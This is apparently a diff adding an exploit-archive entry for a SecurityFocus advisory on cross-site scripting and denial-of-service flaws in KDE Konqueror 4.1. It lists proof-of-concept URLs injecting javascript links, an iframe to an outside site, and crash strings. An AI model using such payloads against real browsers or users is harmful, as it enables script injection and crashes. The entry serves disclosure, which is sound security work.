@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/33085/info
+
+KDE Konqueror is prone to multiple cross-site scripting vulnerabilities and multiple denial-of-service vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, or cause the affected browser to crash.
+
+KDE Konqueror 4.1 is vulnerable; other versions may also be affected.
+
+applications:/<a href="javascript:alert(1)">Here</a>
+trash:/<a href="javascript:alert(1)">Here</a>       
+remote:/<a href="javascript:alert(1)">Here</a>      
+applications:/<font size="8">THE GAME</font>        
+applications:/<iframe src="http://milw0rm.com">                          
+remote://crash:konqueror@                           
+applications://crash:konqueror@    
